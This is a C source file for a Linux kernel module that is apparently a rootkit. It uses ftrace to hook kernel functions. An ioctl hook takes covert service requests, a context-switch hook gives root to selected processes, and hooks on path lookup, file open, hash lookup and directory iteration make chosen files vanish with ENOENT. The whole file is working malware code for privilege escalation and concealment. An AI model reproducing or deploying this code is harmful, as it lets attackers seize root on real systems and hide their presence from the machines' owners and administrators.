#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/namei.h>
#include "ftrace_helper.h"
#include "hooks.h"
#include "service.h"
#include "privileges.h"
#include "hide.h"

/**
 * Some private definitions from the Linux kernel (5.4.0).
 * These are temporary - I will find a way to include these automatically.
 */
struct open_flags {
	int open_flag;
	umode_t mode;
	int acc_mode;
	int intent;
	int lookup_flags;
};

#define EMBEDDED_LEVELS 2
struct nameidata {
	struct path	path;
	struct qstr	last;
	struct path	root;
	struct inode	*inode; /* path.dentry.d_inode */
	unsigned int	flags;
	unsigned	seq, m_seq;
	int		last_type;
	unsigned	depth;
	int		total_link_count;
	struct saved {
		struct path link;
		struct delayed_call done;
		const char *name;
		unsigned seq;
	} *stack, internal[EMBEDDED_LEVELS];
	struct filename	*name;
	struct nameidata *saved;
	struct inode	*link_inode;
	unsigned	root_seq;
	int		dfd;
};

/**
 * Original addresses of hooked functions  
 */
static int (*orig_ksys_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
static struct rq *(*orig_finish_task_switch)(struct task_struct *prev);
static int (*orig_walk_component)(struct nameidata *nd, int flags);
static struct file *(*orig_path_openat)(struct nameidata *nd, const struct open_flags *op, unsigned flags);
static struct dentry *(*orig___lookup_hash)(const struct qstr *name, struct dentry *base, unsigned int flags);
int (*orig_iterate_dir)(struct file *file, struct dir_context *ctx);

/**
 * Hook that catches ioctl requests, and checks if it's a service request.
 */
notrace int hook_ksys_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
{
    int rval = handle_ioctl_request(fd, cmd, arg);

    // 0 means this is not a service request
    if (rval == 0)
        return orig_ksys_ioctl(fd, cmd, arg);
    else
        return rval;
}

/**
 * Hook that catches the last step of a context switch,
 * in order to give the new task root if needed.
 */
notrace static struct rq *hook_finish_task_switch(struct task_struct *prev)
{
    struct pid_list *entry, *to_delete = NULL;
    list_for_each_entry(entry, &pids_waiting_for_root, list) {
        if (entry->pid == current->pid) {
            set_root();
            to_delete = entry;
        }
    }
    if (to_delete != NULL) {
        list_del(&to_delete->list);
        kfree(to_delete);
    }
    return orig_finish_task_switch(prev);
}

/**
 * Hook that catches all steps of a path lookup.
 */
notrace static int hook_walk_component(struct nameidata *nd, int flags)
{
    int err;
    unsigned long ino;

    err = orig_walk_component(nd, flags);

    // make sure lookup succeeded
    if (!err) {
        ino = nd->inode->i_ino;
        if (should_hide_inode(ino))
            err = -ENOENT;
    }
    return err;
}

/**
 * Hook that catches file open operations
 */
notrace static struct file *hook_path_openat(struct nameidata *nd, const struct open_flags *op, unsigned flags)
{
    struct file *err;
    unsigned long ino;

    err = orig_path_openat(nd, op, flags);

    // make sure lookup succeeded
    if (!IS_ERR(err)) {
        ino = nd->inode->i_ino;
        if (should_hide_inode(ino))
            err = ERR_PTR(-ENOENT);
    }
    return err;
}

/**
 * Hook that catches file operations that don't look up the file directly,
 * but its parent instead.
 * 
 * For example: renameat2 looks up the parent and then performs a hash lookup to find the desired child.
 */
notrace static struct dentry *hook___lookup_hash(const struct qstr *name, struct dentry *base, unsigned int flags)
{
    struct dentry *rval;
    unsigned long ino;

    rval = orig___lookup_hash(name, base, flags);

    // make sure lookup succeeded
	if (!IS_ERR(rval) && !d_is_negative(rval)) {
        ino = rval->d_inode->i_ino;
        if (should_hide_inode(ino))
            rval = ERR_PTR(-ENOENT);
    }
    return rval;
}

/**
 * Hook that catches iteration through the entries of a directory.
 */
notrace int hook_iterate_dir(struct file *file, struct dir_context *ctx)
{
    int res;

    // replace the callback with our own
    orig_actor = ctx->actor;
    ctx->actor = filldir_actor;

    // call original function
    res = orig_iterate_dir(file, ctx);

    // restore the original callback in case the context will be used again
    ctx->actor = orig_actor;
    orig_actor = NULL;

    return res;
}

/**
 * Hook definitions.
 * Sometimes the symbol name of a kernel function can contain a prefix or suffix
 * generated by GCC (e.g. path_lookupat.isra.0).
 * The following symbols are for my development machine,
 * and may not exist in this form on other machines.
 * I will find a way to define the hooked function symbol in a robust way.
 */
static struct ftrace_hook hooks[] = {
    HOOK("ksys_ioctl", hook_ksys_ioctl, &orig_ksys_ioctl),
    HOOK("finish_task_switch", hook_finish_task_switch, &orig_finish_task_switch),
    HOOK("walk_component", hook_walk_component, &orig_walk_component),
    HOOK("path_openat", hook_path_openat, &orig_path_openat),
    HOOK("__lookup_hash", hook___lookup_hash, &orig___lookup_hash),
    HOOK("iterate_dir", hook_iterate_dir, &orig_iterate_dir),
};

inline int register_hooks(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

inline void unregister_hooks(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}